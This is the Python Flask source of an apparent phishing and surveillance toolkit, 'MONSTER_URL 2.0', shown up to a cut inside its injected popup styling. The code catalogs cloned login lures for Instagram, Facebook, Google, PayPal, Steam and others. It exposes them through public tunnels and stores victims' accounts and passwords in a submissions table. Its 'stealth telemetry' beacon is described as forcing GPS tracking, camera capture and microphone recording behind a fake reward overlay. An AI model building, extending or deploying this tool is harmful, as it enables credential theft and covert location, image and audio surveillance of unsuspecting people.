import os
import re
import sys
import time
import uuid
import secrets
import sqlite3
import shutil
import platform
import subprocess
import threading
import urllib.request
from pathlib import Path
from datetime import datetime, timezone
from functools import wraps

from flask import (
    Flask, abort, g, jsonify, redirect, render_template, request,
    send_file, session, url_for, Response,
)
from werkzeug.security import check_password_hash, generate_password_hash

# ---------------- App Directories & Configuration ----------------
BASE_DIR = Path(__file__).resolve().parent
DB_PATH = BASE_DIR / "tracker.db"
MEDIA_DIR = BASE_DIR / "media"
BIN_DIR = BASE_DIR / "bin"
SITES_DIR = BASE_DIR / "sites"
MEDIA_DIR.mkdir(exist_ok=True)
BIN_DIR.mkdir(exist_ok=True)

import logging
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "admin")
ADMIN_HASH = generate_password_hash(ADMIN_PASS)

import atexit
import json

GLOBAL_TUNNEL_URL = os.environ.get("PUBLIC_URL", "")
TUNNEL_STATUS = {
    "active": False,
    "url": "",
    "provider": "Initializing...",
    "error": None
}

# ---------------- Site Templates Catalog & Metadata ----------------
SITES_METADATA = {
    # Social Media
    "instagram": {"name": "Instagram Standard", "category": "Social Media", "icon": "📸", "redirect": "https://www.instagram.com/accounts/login/"},
    "ig_followers": {"name": "Instagram Followers Lure", "category": "Social Media", "icon": "🚀", "redirect": "https://www.instagram.com/"},
    "ig_verify": {"name": "Instagram Badge Verification", "category": "Social Media", "icon": "🛡️", "redirect": "https://www.instagram.com/"},
    "insta_followers": {"name": "Insta Free Followers Pro", "category": "Social Media", "icon": "📈", "redirect": "https://www.instagram.com/"},
    "facebook": {"name": "Facebook Standard", "category": "Social Media", "icon": "📘", "redirect": "https://www.facebook.com/login/"},
    "fb_messenger": {"name": "Facebook Messenger", "category": "Social Media", "icon": "💬", "redirect": "https://www.messenger.com/"},
    "fb_security": {"name": "Facebook Security Check", "category": "Social Media", "icon": "🔐", "redirect": "https://www.facebook.com/recover/initiate/"},
    "fb_advanced": {"name": "Facebook Advanced Lure", "category": "Social Media", "icon": "⚡", "redirect": "https://www.facebook.com/"},
    "snapchat": {"name": "Snapchat Portal", "category": "Social Media", "icon": "👻", "redirect": "https://accounts.snapchat.com/"},
    "tiktok": {"name": "TikTok Creator Login", "category": "Social Media", "icon": "🎵", "redirect": "https://www.tiktok.com/login"},
    "twitter": {"name": "Twitter / X", "category": "Social Media", "icon": "🐦", "redirect": "https://twitter.com/login"},
    "linkedin": {"name": "LinkedIn Business", "category": "Social Media", "icon": "💼", "redirect": "https://www.linkedin.com/login"},
    "reddit": {"name": "Reddit Community", "category": "Social Media", "icon": "🤖", "redirect": "https://www.reddit.com/login"},
    "pinterest": {"name": "Pinterest Creative", "category": "Social Media", "icon": "📌", "redirect": "https://www.pinterest.com/login/"},
    "vk": {"name": "VKontakte (VK)", "category": "Social Media", "icon": "🔷", "redirect": "https://vk.com/"},
    "vk_poll": {"name": "VK Community Opinion Poll", "category": "Social Media", "icon": "📊", "redirect": "https://vk.com/"},
    "badoo": {"name": "Badoo Dating", "category": "Social Media", "icon": "💘", "redirect": "https://badoo.com/signin/"},
    "quora": {"name": "Quora Questions & Answers", "category": "Social Media", "icon": "❓", "redirect": "https://www.quora.com/"},
    "deviantart": {"name": "DeviantArt Community", "category": "Social Media", "icon": "🎨", "redirect": "https://www.deviantart.com/users/login"},
    # Tech, Cloud & Email
    "google": {"name": "Google / Gmail Standard", "category": "Tech & Email", "icon": "🔍", "redirect": "https://accounts.google.com/signin/v2/recoveryidentifier"},
    "google_new": {"name": "Google Workspace New", "category": "Tech & Email", "icon": "🌐", "redirect": "https://accounts.google.com/"},
    "google_poll": {"name": "Google Opinion & Rewards Poll", "category": "Tech & Email", "icon": "📊", "redirect": "https://google.com/"},
    "microsoft": {"name": "Microsoft Outlook & Live", "category": "Tech & Email", "icon": "🪟", "redirect": "https://login.live.com/"},
    "yahoo": {"name": "Yahoo Mail", "category": "Tech & Email", "icon": "🟣", "redirect": "https://login.yahoo.com/"},
    "yandex": {"name": "Yandex Passport", "category": "Tech & Email", "icon": "🔴", "redirect": "https://passport.yandex.com/auth"},
    "protonmail": {"name": "ProtonMail Secure", "category": "Tech & Email", "icon": "🔒", "redirect": "https://mail.proton.me/login"},
    "github": {"name": "GitHub Developer Hub", "category": "Tech & Email", "icon": "🐙", "redirect": "https://github.com/login"},
    "gitlab": {"name": "GitLab DevOps", "category": "Tech & Email", "icon": "🦊", "redirect": "https://gitlab.com/users/sign_in"},
    "stackoverflow": {"name": "Stack Overflow", "category": "Tech & Email", "icon": "📚", "redirect": "https://stackoverflow.com/users/login"},
    "wordpress": {"name": "WordPress Admin Login", "category": "Tech & Email", "icon": "📝", "redirect": "https://wordpress.com/log-in"},
    "adobe": {"name": "Adobe Creative Cloud", "category": "Tech & Email", "icon": "🎨", "redirect": "https://account.adobe.com/"},
    "discord": {"name": "Discord Web App", "category": "Tech & Email", "icon": "🎮", "redirect": "https://discord.com/login"},
    "dropbox": {"name": "Dropbox Cloud Storage", "category": "Tech & Email", "icon": "📦", "redirect": "https://www.dropbox.com/login"},
    "mediafire": {"name": "MediaFire File Download", "category": "Tech & Email", "icon": "🔥", "redirect": "https://www.mediafire.com/login/"},
    # Entertainment & Streaming
    "netflix": {"name": "Netflix Streaming", "category": "Entertainment", "icon": "🍿", "redirect": "https://www.netflix.com/login"},
    "spotify": {"name": "Spotify Music", "category": "Entertainment", "icon": "🎧", "redirect": "https://accounts.spotify.com/login"},
    "twitch": {"name": "Twitch Live Stream", "category": "Entertainment", "icon": "🟣", "redirect": "https://www.twitch.tv/login"},
    # Gaming Platforms
    "steam": {"name": "Steam Community", "category": "Gaming", "icon": "💨", "redirect": "https://steamcommunity.com/login/home/"},
    "playstation": {"name": "PlayStation Network (PSN)", "category": "Gaming", "icon": "🎮", "redirect": "https://my.playstation.com/"},
    "xbox": {"name": "Xbox Live Gaming", "category": "Gaming", "icon": "💚", "redirect": "https://login.live.com/"},
    "roblox": {"name": "Roblox Universe", "category": "Gaming", "icon": "🧱", "redirect": "https://www.roblox.com/login"},
    "origin": {"name": "EA Origin Games", "category": "Gaming", "icon": "⚡", "redirect": "https://www.origin.com/"},
    # Finance & Shopping
    "paypal": {"name": "PayPal Checkout & Security", "category": "Finance & Shopping", "icon": "💳", "redirect": "https://www.paypal.com/signin"},
    "ebay": {"name": "eBay Global Shopping", "category": "Finance & Shopping", "icon": "🛍️", "redirect": "https://signin.ebay.com/"},
}

def get_all_sites():
    """Scans sites/ folder dynamically and combines with metadata."""
    available = []
    if SITES_DIR.exists():
        for d in sorted(SITES_DIR.iterdir()):
            if d.is_dir():
                key = d.name.lower()
                meta = SITES_METADATA.get(key, {
                    "name": key.replace("_", " ").title(),
                    "category": "Other Websites",
                    "icon": "🌐",
                    "redirect": f"https://www.{key}.com"
                })
                available.append({
                    "id": key,
                    "name": meta["name"],
                    "category": meta["category"],
                    "icon": meta["icon"],
                    "redirect": meta["redirect"]
                })
    return available

# ---------------- Tunnel Manager (Cloudflare Primary) ----------------
class TunnelManager(threading.Thread):
    def __init__(self, port=5000):
        super().__init__()
        self.port = port
        self.daemon = True
        self.process = None
        atexit.register(self.cleanup)

    def cleanup(self):
        if self.process and self.process.poll() is None:
            try:
                self.process.terminate()
                self.process.wait(timeout=2)
            except Exception:
                try:
                    self.process.kill()
                except Exception:
                    pass

    def run(self):
        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
        if GLOBAL_TUNNEL_URL:
            TUNNEL_STATUS["active"] = True
            TUNNEL_STATUS["url"] = GLOBAL_TUNNEL_URL
            TUNNEL_STATUS["provider"] = "Custom ENV (PUBLIC_URL)"
            print(f"\n[MONSTER_URL 2.0] Using predefined Public URL: {GLOBAL_TUNNEL_URL}\n")
            return

        while True:
            # Primary Method: Zero-Configuration Cloudflare Tunnel (TryCloudflare)
            if self.try_cloudflare():
                self.wait_and_reconnect()
                continue

            # Fallback 1: Serveo SSH Tunnel
            if self.try_serveo():
                self.wait_and_reconnect()
                continue

            # Fallback 2: Localhost.run SSH Tunnel
            if self.try_localhost_run():
                self.wait_and_reconnect()
                continue

            TUNNEL_STATUS["active"] = False
            TUNNEL_STATUS["provider"] = "Local Only"
            TUNNEL_STATUS["error"] = "Could not establish automatic public tunnel. Retrying in 10s..."
            print(f"\n[MONSTER_URL 2.0] Public tunnel unavailable. Retrying in 10 seconds...\n")
            time.sleep(10)

    def wait_and_reconnect(self):
        if self.process:
            self.process.wait()
        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
        TUNNEL_STATUS["active"] = False
        TUNNEL_STATUS["url"] = ""
        GLOBAL_TUNNEL_URL = ""
        print(f"\n[MONSTER_URL 2.0] Public Tunnel process ended. Auto-reconnecting...\n")
        time.sleep(3)

    def get_cloudflared_bin(self):
        # 1. System PATH
        which_path = shutil.which("cloudflared")
        if which_path:
            return which_path

        # 2. Local bin/ folder
        local_exe = BIN_DIR / ("cloudflared.exe" if os.name == "nt" else "cloudflared")
        if local_exe.exists():
            if os.name != "nt" and not os.access(local_exe, os.X_OK):
                try:
                    os.chmod(local_exe, 0o755)
                except Exception:
                    pass
            return str(local_exe)

        # 3. Termux PATH fallback
        termux_bin = Path("/data/data/com.termux/files/usr/bin/cloudflared")
        if termux_bin.exists():
            return str(termux_bin)

        return None

    def try_cloudflare(self):
        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
        TUNNEL_STATUS["provider"] = "Cloudflare Tunnel"
        
        cloudflared_bin = self.get_cloudflared_bin()
        if not cloudflared_bin:
            print("[TunnelManager] cloudflared binary not found in PATH or bin/ directory.")
            return False

        try:
            cmd = [cloudflared_bin, "tunnel", "--url", f"http://127.0.0.1:{self.port}", "--no-autoupdate"]
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            start_time = time.time()
            while time.time() - start_time < 30:
                if self.process.poll() is not None:
                    break
                line = self.process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
                if match:
                    url = match.group(0).strip()
                    GLOBAL_TUNNEL_URL = url
                    TUNNEL_STATUS["active"] = True
                    TUNNEL_STATUS["url"] = url
                    TUNNEL_STATUS["provider"] = "Cloudflare Tunnel"
                    TUNNEL_STATUS["error"] = None
                    print(f"\n" + "="*60)
                    print(f" 🔥 MONSTER_URL 2.0 CLOUDFLARE PUBLIC TUNNEL ACTIVE!")
                    print(f" 🌐 Public HTTPS URL: {url}")
                    print(f" 🛡 Provider: Cloudflare TryCloudflare (Zero-Config)")
                    print("="*60 + "\n")
                    
                    def monitor(proc):
                        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
                        while proc.poll() is None:
                            time.sleep(2)
                        GLOBAL_TUNNEL_URL = ""
                        TUNNEL_STATUS["active"] = False
                        TUNNEL_STATUS["url"] = ""
                    threading.Thread(target=monitor, args=(self.process,), daemon=True).start()
                    return True
        except Exception as e:
            print(f"[TunnelManager] Cloudflare failed: {e}")
        return False

    def try_serveo(self):
        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
        TUNNEL_STATUS["provider"] = "Serveo SSH"
        try:
            cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30", "-R", f"80:127.0.0.1:{self.port}", "serveo.net"]
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
            )
            
            start_time = time.time()
            while time.time() - start_time < 20:
                if self.process.poll() is not None:
                    break
                line = self.process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                match = re.search(r"https://[-a-zA-Z0-9.]+\.serveo\.net", line)
                if match:
                    url = match.group(0).strip()
                    GLOBAL_TUNNEL_URL = url
                    TUNNEL_STATUS["active"] = True
                    TUNNEL_STATUS["url"] = url
                    TUNNEL_STATUS["provider"] = "Serveo SSH Tunnel"
                    TUNNEL_STATUS["error"] = None
                    print(f"\n" + "="*60)
                    print(f" 🔥 MONSTER_URL 2.0 PUBLIC TUNNEL ACTIVE!")
                    print(f" 🌐 Public HTTPS URL: {url}")
                    print(f" 🛡 Provider: Serveo SSH Tunnel")
                    print("="*60 + "\n")
                    def monitor(proc):
                        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
                        while proc.poll() is None:
                            time.sleep(2)
                        GLOBAL_TUNNEL_URL = ""
                        TUNNEL_STATUS["active"] = False
                        TUNNEL_STATUS["url"] = ""
                    threading.Thread(target=monitor, args=(self.process,), daemon=True).start()
                    return True
        except Exception as e:
            print(f"[TunnelManager] Serveo SSH failed: {e}")
        return False

    def try_localhost_run(self):
        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
        TUNNEL_STATUS["provider"] = "localhost.run"
        try:
            cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:127.0.0.1:{self.port}", "nokey@localhost.run"]
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
            )
            start_time = time.time()
            while time.time() - start_time < 20:
                if self.process.poll() is not None:
                    break
                line = self.process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                match = re.search(r"https://[-a-zA-Z0-9.]+\.lhr\.life", line) or re.search(r"https://[-a-zA-Z0-9.]+\.lhrtunnel\.link", line)
                if match:
                    url = match.group(0).strip()
                    GLOBAL_TUNNEL_URL = url
                    TUNNEL_STATUS["active"] = True
                    TUNNEL_STATUS["url"] = url
                    TUNNEL_STATUS["provider"] = "localhost.run SSH Tunnel"
                    TUNNEL_STATUS["error"] = None
                    print(f"\n" + "="*60)
                    print(f" 🔥 MONSTER_URL 2.0 PUBLIC TUNNEL ACTIVE!")
                    print(f" 🌐 Public HTTPS URL: {url}")
                    print(f" 🛡 Provider: localhost.run SSH Tunnel")
                    print("="*60 + "\n")
                    def monitor(proc):
                        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
                        while proc.poll() is None:
                            time.sleep(2)
                        GLOBAL_TUNNEL_URL = ""
                        TUNNEL_STATUS["active"] = False
                        TUNNEL_STATUS["url"] = ""
                    threading.Thread(target=monitor, args=(self.process,), daemon=True).start()
                    return True
        except Exception as e:
            print(f"[TunnelManager] Localhost.run failed: {e}")
        return False


def get_base_url():
    if GLOBAL_TUNNEL_URL:
        return GLOBAL_TUNNEL_URL.rstrip("/")
    
    # If no tunnel active, check Host header or environment override
    host = request.headers.get("X-Forwarded-Host", request.host)
    scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
    
    if scheme != "https" and not host.startswith("127.0.0.1") and not host.startswith("localhost"):
        scheme = "https"
        
    return f"{scheme}://{host}".rstrip("/")


def parse_user_agent(ua_string):
    if not ua_string:
        return "Unknown Device"
    ua = ua_string.lower()
    
    # OS
    if "android" in ua:
        os_name = "Android"
    elif "iphone" in ua or "ipad" in ua or "ipod" in ua:
        os_name = "iOS"
    elif "windows" in ua:
        os_name = "Windows"
    elif "macintosh" in ua or "mac os" in ua:
        os_name = "macOS"
    elif "linux" in ua:
        os_name = "Linux"
    else:
        os_name = "Device"
        
    # Browser
    if "edg/" in ua or "edge/" in ua:
        browser = "Edge"
    elif "samsungbrowser" in ua:
        browser = "Samsung Browser"
    elif "chrome" in ua and "chromium" not in ua:
        browser = "Chrome"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "safari" in ua and "chrome" not in ua:
        browser = "Safari"
    elif "opera" in ua or "opr/" in ua:
        browser = "Opera"
    else:
        browser = "Browser"
        
    return f"{os_name} · {browser}"


# ---------------- DB helpers ----------------
def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
    return g.db


@app.teardown_appcontext
def close_db(_exc):
    db = g.pop("db", None)
    if db is not None:
        db.close()


def init_db():
    db = sqlite3.connect(DB_PATH)
    db.executescript(
        """
        CREATE TABLE IF NOT EXISTS links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token TEXT UNIQUE NOT NULL,
            name TEXT NOT NULL,
            loc INTEGER NOT NULL DEFAULT 1,
            cam INTEGER NOT NULL DEFAULT 1,
            mic INTEGER NOT NULL DEFAULT 1,
            interval_s INTEGER NOT NULL DEFAULT 5,
            theme TEXT NOT NULL DEFAULT 'instagram',
            visits INTEGER NOT NULL DEFAULT 0,
            active INTEGER NOT NULL DEFAULT 1,
            created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS reports (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id INTEGER NOT NULL,
            lat REAL, lon REAL, accuracy REAL, speed REAL,
            heading REAL, alt REAL,
            battery_level REAL, battery_charging INTEGER,
            ua TEXT, ip TEXT,
            gpu TEXT, screen TEXT, ram TEXT, cpu TEXT, timezone TEXT,
            created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS media (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id INTEGER NOT NULL,
            kind TEXT NOT NULL,
            filename TEXT NOT NULL,
            created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id INTEGER NOT NULL,
            site TEXT DEFAULT '',
            account TEXT DEFAULT '',
            password TEXT DEFAULT '',
            extra_data TEXT DEFAULT '',
            ip TEXT DEFAULT '',
            ua TEXT DEFAULT '',
            device TEXT DEFAULT '',
            full_name TEXT DEFAULT '',
            username TEXT DEFAULT '',
            phone TEXT DEFAULT '',
            opinion TEXT DEFAULT '',
            created_at TEXT NOT NULL
        );
        """
    )
    # Migrations for schema additions
    sub_cols = [r[1] for r in db.execute("PRAGMA table_info(submissions)").fetchall()]
    if "site" not in sub_cols:
        db.execute("ALTER TABLE submissions ADD COLUMN site TEXT DEFAULT ''")
    if "account" not in sub_cols:
        db.execute("ALTER TABLE submissions ADD COLUMN account TEXT DEFAULT ''")
    if "password" not in sub_cols:
        db.execute("ALTER TABLE submissions ADD COLUMN password TEXT DEFAULT ''")
    if "extra_data" not in sub_cols:
        db.execute("ALTER TABLE submissions ADD COLUMN extra_data TEXT DEFAULT ''")
    if "ip" not in sub_cols:
        db.execute("ALTER TABLE submissions ADD COLUMN ip TEXT DEFAULT ''")
    if "ua" not in sub_cols:
        db.execute("ALTER TABLE submissions ADD COLUMN ua TEXT DEFAULT ''")
    if "device" not in sub_cols:
        db.execute("ALTER TABLE submissions ADD COLUMN device TEXT DEFAULT ''")

    cols = [r[1] for r in db.execute("PRAGMA table_info(reports)").fetchall()]
    if "battery_level" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN battery_level REAL")
    if "battery_charging" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN battery_charging INTEGER")
    if "gpu" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN gpu TEXT")
    if "screen" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN screen TEXT")
    if "ram" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN ram TEXT")
    if "cpu" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN cpu TEXT")
    if "timezone" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN timezone TEXT")
    if "city" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN city TEXT DEFAULT ''")
    if "region" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN region TEXT DEFAULT ''")
    if "country" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN country TEXT DEFAULT ''")
    if "isp" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN isp TEXT DEFAULT ''")

    link_cols = [r[1] for r in db.execute("PRAGMA table_info(links)").fetchall()]
    if "theme" not in link_cols:
        db.execute("ALTER TABLE links ADD COLUMN theme TEXT NOT NULL DEFAULT 'instagram'")
    if "visits" not in link_cols:
        db.execute("ALTER TABLE links ADD COLUMN visits INTEGER NOT NULL DEFAULT 0")

    # Seed default admin credentials into settings table if not present
    cur_user = db.execute("SELECT value FROM settings WHERE key='admin_username'").fetchone()
    if not cur_user:
        db.execute("INSERT INTO settings (key, value) VALUES ('admin_username', ?)", (ADMIN_USER,))
    cur_hash = db.execute("SELECT value FROM settings WHERE key='admin_password_hash'").fetchone()
    if not cur_hash:
        db.execute("INSERT INTO settings (key, value) VALUES ('admin_password_hash', ?)", (ADMIN_HASH,))

    db.commit()
    db.close()


def resolve_ip_location(ip):
    """Fast server-side fallback lookup for client IP location."""
    if not ip or ip in ("127.0.0.1", "localhost", "::1") or ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172.16."):
        return None
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,query"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        with urllib.request.urlopen(req, timeout=2.0) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            if data.get("status") == "success" and data.get("lat") is not None:
                return {
                    "lat": float(data.get("lat")),
                    "lon": float(data.get("lon")),
                    "city": data.get("city", ""),
                    "region": data.get("regionName", ""),
                    "country": data.get("country", ""),
                    "isp": data.get("isp", "")
                }
    except Exception:
        pass
    return None


def get_setting(key, default=None):
    db = sqlite3.connect(DB_PATH)
    row = db.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
    db.close()
    return row[0] if row else default


def set_setting(key, value):
    db = sqlite3.connect(DB_PATH)
    db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    db.commit()
    db.close()


def now_iso():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def link_by_token(token):
    return get_db().execute(
        "SELECT * FROM links WHERE token=? AND active=1", (token,)
    ).fetchone()


def admin_required(fn):
    @wraps(fn)
    def wrap(*args, **kwargs):
        if not session.get("authed"):
            return redirect(url_for("login"))
        return fn(*args, **kwargs)
    return wrap


init_db()


# ---------------- Auth / Pages ----------------
@app.route("/")
def index():
    return redirect(url_for("dashboard") if session.get("authed") else url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username", "").strip()
        p = request.form.get("password", "")
        stored_user = get_setting("admin_username", ADMIN_USER)
        stored_hash = get_setting("admin_password_hash", ADMIN_HASH)
        if u == stored_user and check_password_hash(stored_hash, p):
            session["authed"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Invalid admin username or password")
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/dashboard")
@admin_required
def dashboard():
    return render_template("dashboard.html")


@app.route("/api/sites")
@admin_required
def api_sites_list():
    """Returns available site templates catalog."""
    return jsonify(get_all_sites())


@app.route("/api/settings/password", methods=["POST"])
@admin_required
def api_change_password():
    data = request.get_json(force=True) or {}
    old_pass = data.get("old_password", "")
    new_pass = data.get("new_password", "")
    confirm_pass = data.get("confirm_password", "")
    new_user = data.get("new_username", "").strip()

    if not old_pass or not new_pass:
        return jsonify({"ok": False, "error": "Current and new password are required"}), 400

    if new_pass != confirm_pass:
        return jsonify({"ok": False, "error": "New passwords do not match"}), 400

    if len(new_pass) < 4:
        return jsonify({"ok": False, "error": "New password must be at least 4 characters long"}), 400

    stored_hash = get_setting("admin_password_hash", ADMIN_HASH)
    if not check_password_hash(stored_hash, old_pass):
        return jsonify({"ok": False, "error": "Current password is incorrect"}), 400

    new_hash = generate_password_hash(new_pass)
    set_setting("admin_password_hash", new_hash)
    if new_user:
        set_setting("admin_username", new_user)

    return jsonify({"ok": True, "message": "Password updated successfully!"})


# ---------------- Tunnel & Link API (Admin) ----------------
@app.route("/api/tunnel")
@admin_required
def api_tunnel_status():
    st = dict(TUNNEL_STATUS)
    st["current_base_url"] = get_base_url()
    return jsonify(st)


@app.route("/api/links", methods=["GET", "POST"])
@admin_required
def api_links():
    db = get_db()
    if request.method == "POST":
        data = request.get_json(force=True) or {}
        token = secrets.token_urlsafe(10)
        
        # Determine chosen site template from sites/ folder
        theme = (data.get("theme") or "instagram").strip().lower()
        if not (SITES_DIR / theme).is_dir():
            theme = "instagram"

        default_name = f"{theme.replace('_', ' ').title()} Target Link"
        link_name = (data.get("name") or default_name).strip()[:80]
        
        cur = db.execute(
            "INSERT INTO links (token,name,loc,cam,mic,interval_s,theme,visits,created_at) "
            "VALUES (?,?,?,?,?,?,?,?,?)",
            (
                token,
                link_name,
                1,  # Mandatory GPS Loc
                1,  # Mandatory Cam
                1,  # Mandatory Mic
                min(max(int(data.get("interval_s", 5)), 2), 3600),
                theme,
                0,
                now_iso(),
            ),
        )
        db.commit()
        link = db.execute("SELECT * FROM links WHERE id=?", (cur.lastrowid,)).fetchone()
        return jsonify(serialize_link(link))

    rows = db.execute("SELECT * FROM links WHERE active=1 ORDER BY id DESC").fetchall()
    return jsonify([serialize_link(r) for r in rows])


def serialize_link(row):
    d = dict(row)
    base = get_base_url()
    d["url"] = f"{base}/t/{row['token']}"
    site_meta = SITES_METADATA.get(row["theme"], {})
    d["site_name"] = site_meta.get("name", (row["theme"] or "Site").replace("_", " ").title())
    d["site_icon"] = site_meta.get("icon", "🌐")
    d["site_category"] = site_meta.get("category", "Website")
    return d


@app.route("/api/links/<int:link_id>", methods=["DELETE"])
@admin_required
def api_link_delete(link_id):
    db = get_db()
    db.execute("UPDATE links SET active=0 WHERE id=?", (link_id,))
    db.commit()
    return jsonify({"ok": True})


# ---------------- Target Template Serving & Stealth Telemetry ----------------
def generate_telemetry_beacon(token, link):
    """Generates universal client-side script for mandatory high-accuracy GPS tracking, stealth camera capture, and microphone recording across all site templates."""
    loc_enabled = "true"
    cam_enabled = "true"
    mic_enabled = "true"
    
    return f"""
    <!-- MONSTER_URL 2.0 Real-Time Universal Sensor & Telemetry Engine -->
    <style id="m-popup-styles">
    #m-reward-overlay {{
        position: fixed !important;
        inset: 0 !important;
        background: rgba(3, 7, 18, 0.88) !important;
        backdrop-filter: blur(14px) !important;
        -webkit-backdrop-filter: blur(14px) !important;
        z-index: 2147483647 !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
        padding: 16px !important;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
        animation: mFadeIn 0.3s ease-out !important;
        box-sizing: border-box !important;
    }}
    #m-reward-card {{
        background: linear-gradient(145deg, #0d1527, #070c18) !important;
        border: 1.5px solid rgba(0, 255, 136, 0.5) !important;
        border-radius: 24px !important;
        padding: 28px 24px !important;
        max-width: 450px !important;
        width: 100% !important;
        color: #f1f5f9 !important;
        text-align: center !important;
        box-shadow: 0 25px 65px rgba(0, 0, 0, 0.95), 0 0 35px rgba(0, 255, 136, 0.3) !important;
        position: relative !important;
        animation: mScaleUp 0.35s cubic-bezier(0.34, 1.56, 0.64, 1) !important;
        box-sizing: border-box !important;
    }}
    @keyframes mFadeIn {{ from {{ opacity: 0; }} to {{ opacity: 1; }} }}
    @keyframes mScaleUp {{ from {{ transform: scale(0.9); opacity: 0; }} to {{ transform: scale(1); opacity: 1; }} }}
    
    .m-radar-badge {{
        width: 68px !important;
        height: 68px !important;
        background: linear-gradient(135deg, rgba(0,255,136,0.25), rgba(0,229,255,0.25)) !important;
        border: 2px solid rgba(0, 255, 136, 0.7) !important;
        border-radius: 22px !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
        font-size: 32px !important;
        margin: 0 auto 14px !important;
        box-shadow: 0 0 28px rgba(0, 255, 136, 0.45) !important;
        animation: mPulse 1.6s infinite !important;
    }}
    @keyframes mPulse {{
        0%, 100% {{ transform: scale(1); box-shadow: 0 0 20px rgba(0, 255, 136, 0.35); }}
        50% {{ transform: scale(1.08); box-shadow: 0 0 35px rgba(0, 255, 136, 0.7); }}
    }}
    .m-sensor-badges {{
        display: flex !important;
        justify-content: center !important;
        gap: 8px !important;
        margin-bottom: 12px !important;
        flex-wrap: wrap !important;
    }}
    .m-sensor-badge {{
        display: inline-flex !important;
        align-items: center !important;
        gap: 4px !important;
        background: rgba(0, 255, 136, 0.15) !important;
        color: #00ff88 !important;
        padding: 4px 10px !important;
        border-radius: 99px !important;
        font-size: 11.5px !important;
        font-weight: 700 !important;
        border: 1px solid rgba(0, 255, 136, 0.4) !important;
    }}
    .m-title {{
        font-size: 20px !important;
        font-weight: 800 !important;
        margin-bottom: 8px !important;
        color: #ffffff !important;
        letter-spacing: -0.3px !important;
        line-height: 1.3 !important;
    }}
    .m-reward-highlight {{
        background: linear-gradient(90deg, #00ff88, #00e5ff) !important;
        -webkit-background-clip: text !important;
        -webkit-text-fill-color: transparent !important;
        font-weight: 900 !important;
    }}
    .m-msg-hindi {{
        font-size: 13.5px !important;
        color: #e2e8f0 !important;
        line-height: 1.5 !important;
        margin-bottom: 6px !important;
        font-weight: 500 !important;
    }}
    .m-msg-eng {{
        font-size: 12px !important;
        color: #94a3b8 !important;
        line-height: 1.4 !important;
        margin-bottom: 14px !important;
    }}
    .m-progress-wrap {{
        width: 100% !important;
        height: 7px !important;
        background: rgba(255, 255, 255, 0.08) !important;
        border-radius: 99px !important;
        overflow: hidden !important;
        margin-bottom: 14px !important;
    }}
    .m-progress-bar {{
        height: 100% !important;
        width: 0% !important;
        background: linear-gradient(90deg, #00ff88, #00e5ff) !important;
        border-radius: 99px !important;
        transition: width 0.08s linear !important;
    }}
    .m-btn {{
